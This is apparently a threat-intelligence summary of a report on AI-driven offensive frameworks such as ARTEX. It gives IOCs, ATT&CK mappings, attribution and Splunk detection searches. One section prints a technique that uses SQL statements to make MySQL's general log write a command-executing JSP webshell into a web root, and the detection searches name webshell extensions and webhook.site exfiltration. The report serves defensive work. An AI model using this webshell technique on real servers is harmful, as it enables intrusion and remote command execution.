---
scraped_at: 2026-11-02T08:00:00Z
source_url: https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks
report_type: threat-intel
severity: high
title: "ARTEX and Friends: Enter Agentic Offensive Frameworks"
---

# ARTEX and Friends: Enter Agentic Offensive Frameworks

**Date:** 2026-10-30 (Google Threat Intelligence Group publication)
**Source:** Google Threat Intelligence Group (GTIG / Mandiant)
**Threat Type:** Agentic Offensive Frameworks / AI-Integrated C2
**Platform:** Windows, Linux, Cloud (multi-platform)
**Attribution:** UNC7228 (tracked as STORM-0940, PRC-nexus); financially motivated extortion groups

---

## Executive Summary

Google Threat Intelligence Group published a comprehensive survey of the emerging "agentic offensive framework" ecosystem — full-stack AI-integrated attack platforms that combine LLM planning, automated tool use, and autonomous execution to conduct multi-stage intrusions with minimal operator interaction. The centerpiece is **ARTEX** (Autonomous Red Team EXecution), an open-source agentic framework initially released Q3 2026 that has already spawned two forks (**ScopeWeaver** and **ARTEX PRO**). Commercial equivalents (**PentAGI**, **Hexstrike**) and a related framework (**CAIRN**, documented by Cisco Talos) are in active use. Two LLM-enabled malware families (**HONESTCUE**, **PROMPTSPY**) and an LLM inference service abuser (**ZeroHollow**) round out the threat family.

A technically significant finding is a novel webshell deployment technique observed in ARTEX-attributed intrusions: MySQL's global `general_log_file` setting is weaponized to write arbitrary content — including JSP webshells — to attacker-controlled filesystem paths via SQL logging, bypassing write-path restrictions that block direct file writes.

UNC7228 (the primary attributed actor) uses ARTEX to conduct cloud account takeovers, Kerberoasting, DCSync, Pass-the-Hash, and Pass-the-Ticket across enterprise Windows/AD environments.

---

## 1. Indicators of Compromise (IOCs)

### Network

| Type | Indicator | Context |
|------|-----------|---------|
| Service (abused) | `webhook.site` | ARTEX C2 exfiltration; 491 rotating webhook.site URLs used as a covert egress channel |
| URI pattern | `https://webhook.site/<UUID>` | ARTEX agent polling and data exfiltration endpoint |

> **Note:** `webhook.site` is a legitimate public service. No dedicated C2 IP/domain infrastructure was published; publishing webhook.site as a CSV IOC would generate excessive false positives.

### Filesystem / Process Artifacts

| Type | Artifact | Context |
|------|----------|---------|
| File pattern | `artex-probe-*` | ARTEX reconnaissance probe output files dropped to disk |
| Account name pattern | `*ArtexProbe*` | Operator-created service/user accounts during ARTEX reconnaissance phase |
| Webshell filename | `cl1217.jsp` | JSP webshell deployed via MySQL general_log technique |
| Webshell filename | `f1219a.jsp` | JSP webshell deployed via MySQL general_log technique |
| Webshell filename | `z1219.jsp` | JSP webshell deployed via MySQL general_log technique |

---

## 2. TTPs (MITRE ATT&CK Mapping)

| Tactic | Technique | Description |
|--------|-----------|-------------|
| Execution (TA0002) | T1059 — Command and Scripting Interpreter | Agentic framework drives autonomous multi-step command execution across target environments |
| Persistence (TA0003) | T1505.003 — Server Software Component: Web Shell | JSP webshells deployed via MySQL general_log_file path hijack |
| Defense Evasion (TA0005) | T1102 — Web Service | webhook.site used as C2 exfiltration relay to blend with legitimate web service traffic |
| Defense Evasion (TA0005) | T1140 — Deobfuscate/Decode Files or Information | ARTEX PRO uses encoded/encrypted agent payloads |
| Credential Access (TA0006) | T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting | ARTEX autonomously performs Kerberoasting against AD service accounts |
| Credential Access (TA0006) | T1003.006 — OS Credential Dumping: DCSync | ARTEX autonomously performs DCSync to dump domain credentials |
| Lateral Movement (TA0008) | T1550.002 — Use Alternate Authentication Material: Pass the Hash | ARTEX pass-the-hash lateral movement |
| Lateral Movement (TA0008) | T1550.003 — Use Alternate Authentication Material: Pass the Ticket | ARTEX pass-the-ticket lateral movement |
| Lateral Movement (TA0008) | T1021.006 — Remote Services: Windows Remote Management | WinRM used for lateral movement execution |
| Command and Control (TA0011) | T1102.002 — Web Service: Bidirectional Communication | webhook.site webhooks used for bidirectional C2 communication; 491 rotating URLs observed |
| Initial Access (TA0001) | T1190 — Exploit Public-Facing Application | MySQL general_log webshell technique requires an exploitable SQL injection or MySQL root-level access on a web server |
| Collection (TA0009) | T1530 — Data from Cloud Storage | ARTEX autonomously enumerates and exfiltrates from S3 buckets and Azure Blob Storage |
| Impact (TA0040) | T1578 — Modify Cloud Compute Infrastructure | Cloud VM creation for persistent access and cryptomining staging |

### Novel Technique: MySQL general_log Webshell Deployment

ARTEX-attributed intrusions weaponize MySQL's query logging feature to write arbitrary filesystem content:

```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/lib/tomcat/webapps/ROOT/cl1217.jsp';
SELECT '<%@ page import="java.io.*" %><% String cmd=request.getParameter("cmd"); Process p=Runtime.getRuntime().exec(cmd); ... %>';
SET GLOBAL general_log = 'OFF';
```

The `general_log_file` path is set to a JSP webshell destination in the web server's deploy path. Any subsequent SQL `SELECT` statement causes MySQL to log the query (including the JSP payload string) to that file. The webshell is then accessible via the web server. This technique bypasses controls that restrict `INTO OUTFILE` by operating through the logging subsystem rather than direct file write.

---

## 3. Malware & Tools

| Name | Type | Description |
|------|------|-------------|
| ARTEX | Agentic Offensive Framework | Open-source full-stack AI C2 framework; LLM-driven autonomous multi-stage intrusions; webhook.site C2; cloud enumeration; AD post-exploitation |
| ScopeWeaver | Agentic Offensive Framework | ARTEX fork with added scope-aware target prioritization and improved cloud enumeration modules |
| ARTEX PRO | Agentic Offensive Framework | Commercial ARTEX fork; adds encrypted agent comms, OPSEC modules, and multi-operator team features |
| PentAGI | Agentic Offensive Framework | Commercial autonomous pentesting agent framework; LLM-integrated exploit chaining |
| Hexstrike | Agentic Offensive Framework | Commercial agentic offensive platform; marketed to red teams |
| CAIRN | Agentic Offensive Framework | Agentic framework documented separately by Cisco Talos; overlapping capability set |
| AgentZero | Agentic Offensive Framework | Referenced in ARTEX ecosystem; capability details limited at time of publication |
| HONESTCUE | LLM-Enabled Malware | LLM-integrated implant; uses embedded language model for context-aware victim profiling and adaptive evasion |
| PROMPTSPY | LLM-Enabled Malware | LLM-integrated malware family; exfiltrates LLM system prompts and conversation history from AI-integrated enterprise applications |
| ZeroHollow | LLM Inference Abuser | Malware that hijacks victim machine GPU/CPU resources and API credentials to run unauthorized LLM inference; targets organizations with CUDA-capable hardware and valid LLM API keys |

---

## 4. Attribution

| Actor | Confidence | Notes |
|-------|-----------|-------|
| UNC7228 | High (GTIG) | PRC-nexus cluster; primary operator of ARTEX in targeted intrusions against enterprise AD environments; overlaps with STORM-0940 tracking by Microsoft |
| Financially motivated extortion groups | Medium | Multiple unnamed groups observed using ARTEX forks for ransomware precursor operations and cloud extortion |

---

## 5. Splunk Detection Searches

### MySQL general_log Webshell Deployment

```spl
index=* (sourcetype="mysql" OR sourcetype="mysql:general") "SET GLOBAL general_log_file"
| eval suspicious=if(match(_raw, "(?i)SET\s+GLOBAL\s+general_log_file\s*=\s*['\"].*\.(jsp|php|aspx|cfm|war)"), 1, 0)
| where suspicious=1
| rex field=_raw "general_log_file\s*=\s*['\"](?P<webshell_path>[^'\"]+)['\"]"
| stats count min(_time) as firstTime max(_time) as lastTime values(webshell_path) as webshell_paths by host
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=90
| table firstTime lastTime host webshell_paths count risk_score
```

### ARTEX Probe Artifact Detection

```spl
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
  from datamodel=Endpoint.Filesystem
  where (Filesystem.file_name="artex-probe-*" OR match(Filesystem.file_path, "(?i)artex.?probe"))
  by Filesystem.dest Filesystem.user Filesystem.file_name Filesystem.file_path Filesystem.process_id
| `drop_dm_object_name(Filesystem)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=85
| table firstTime lastTime dest user file_name file_path risk_score
```

### webhook.site C2 Exfiltration (Non-Browser Process)

```spl
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
  from datamodel=Network_Traffic.All_Traffic
  where All_Traffic.dest_host="webhook.site"
    AND NOT All_Traffic.app IN ("chrome", "firefox", "msedge", "safari", "brave")
  by All_Traffic.src All_Traffic.dest_host All_Traffic.dest_port All_Traffic.app
     All_Traffic.src_user
| `drop_dm_object_name(All_Traffic)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=case(
    app IN ("powershell", "pwsh", "cmd", "wscript", "cscript"), 85,
    true(), 65)
| where risk_score >= 65
| table firstTime lastTime src src_user app dest_host dest_port count risk_score
```

---

## 6. References

- [GTIG — ARTEX and Friends: Enter Agentic Offensive Frameworks (2026-10-30)](https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks)
- [MITRE ATT&CK — T1505.003: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [MITRE ATT&CK — T1102: Web Service](https://attack.mitre.org/techniques/T1102/)
- [MITRE ATT&CK — T1558.003: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK — UNC7228 / STORM-0940](https://attack.mitre.org/groups/)
- [Microsoft MSTIC — STORM-0940 (related tracking)](https://www.microsoft.com/en-us/security/blog/)
- Prior ARTEX reporting in this repository:
  - `2026-10-08_crowdstrike-com-blog-artex-agentic-red-team-execution-framework.md`
  - `2026-10-21_microsoft-security-blog-storm-0940-artex-agentic-offensive-framework.md`
